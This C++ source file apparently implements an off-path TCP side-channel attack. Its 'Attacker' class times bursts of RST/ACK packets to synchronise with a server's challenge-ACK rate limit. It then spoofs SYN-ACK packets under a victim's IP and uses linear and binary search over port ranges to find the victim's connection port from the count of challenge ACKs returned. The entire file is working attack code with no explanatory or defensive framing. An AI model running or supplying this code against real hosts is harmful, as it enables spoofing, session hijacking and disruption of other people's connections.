#include "attacker.h"

#include <vector>
#include <thread>
#include <iostream>

#include "common.h"
#include "packet_counter.h"

using namespace std;
using namespace Tins;

Attacker::Attacker(
        ConnectionID legitConn,
        uint32_t legitLastSeq,
        const string& victimIP) : 
    legitConn_(legitConn), legitLastSeq_(legitLastSeq), victimIP_(victimIP) {}

chrono::milliseconds Attacker::synchronizeClock() {
    Tins::PacketSender sender;
    
    auto pkt = make_packet(legitConn_, "RA", legitLastSeq_ + 3);    
    auto pcounter = PacketCounter::instance();

    uint32_t n1, n2;
    {
        cout << "Sending out 200 packets in 1 sec..." << endl;
        pcounter->startCounting();
        auto s = align_and_delay(0ms);
        for (int i = 0; i < 200; i++) {
            sender.send(pkt);
            s += 5ms;
            this_thread::sleep_until(system_clock::time_point(s));
        }
        this_thread::sleep_for(2s);
        n1 = pcounter->stopCounting();
        cout << "n1 = " << n1 << endl;
    }

    {
        cout << "Sending out 200 packets in 1 sec and 5ms delay..." << endl;
        pcounter->startCounting();
        auto s = align_and_delay(5ms);
        for (int i = 0; i < 200; i++) {
            sender.send(pkt);
            s += 5ms;
            this_thread::sleep_until(system_clock::time_point(s));
        }
        this_thread::sleep_for(2s);
        n2 = pcounter->stopCounting();
        cout << "n2 = " << n2 << endl;
    }

    uint32_t delay_ms = 0;
    if (n1 == 100) {
        delay_ms = 0;
    } else if (n2 == 100) {
        delay_ms = 5;
    } else if (n1 > n2) {
        delay_ms = 5 + (n2 - 100) * 1000 / 200;
    } else {
        delay_ms = 5 + (300 - n2) * 1000 / 200;
    }
    syncDelayMs_ = milliseconds(delay_ms);
    return syncDelayMs_;
}

uint32_t Attacker::find_port(uint32_t from, uint32_t to) {
    int range = 5000;
    auto start = from;
    cout << "Linear search" << endl;
    while (start <= to) {
        auto finish = min(start + range - 1, to);
        cout << "Probing ports " << start << "..." << finish << ": " << flush;
        if (has_port(start, finish)) {
            cout << "Yes" << endl;
            from = start;
            to = finish;
            break;
        }
        cout << "No" << endl;
        start = finish + 1;
    }

    cout << "Binary search" << endl;
    auto left = from;
    auto right = to;
    while (left < right) {
        auto mid = (left + right + 1) / 2;
        cout << "Probing ports " << mid << "..." << right << ": " << flush;
        if (has_port(mid, right)) {
            cout << "Yes" << endl;
            left = mid;
        } else {
            cout << "No" << endl;
            right = mid - 1;
        }
    }
    victimPort_ = left;
    return left;
}

bool Attacker::has_port(uint32_t from, uint32_t to) {
    vector<IP> packets;
    ConnectionID victimConn(victimIP_, 0, legitConn_.serverIP, legitConn_.serverPort);
    for (auto port = from; port <= to; port++) {
        victimConn.clientPort = port;
        packets.push_back(make_packet(victimConn, "SA", 0));
    }
    for (int i = 0; i < 100; i++) {
        packets.push_back(make_packet(legitConn_, "RA", legitLastSeq_ + 3));
    }

    auto pcounter = PacketCounter::instance();
    int retry = 3;
    while (retry > 0) {
        pcounter->startCounting();
        align_and_delay(syncDelayMs_);
        for (auto p : packets) {
            sender_.send(p);
            this_thread::sleep_for(10us);
        }
        this_thread::sleep_for(2s);
        auto numReceived = pcounter->stopCounting();
        if (numReceived == 99) {
            return true;
        } else if (numReceived == 100) {
            return false;
        }
        cout << endl << "Received " << numReceived << " packets. Retrying..." << endl;
        retry--;
    }
    throw "Too much packet loss or clock is not synchronized";
}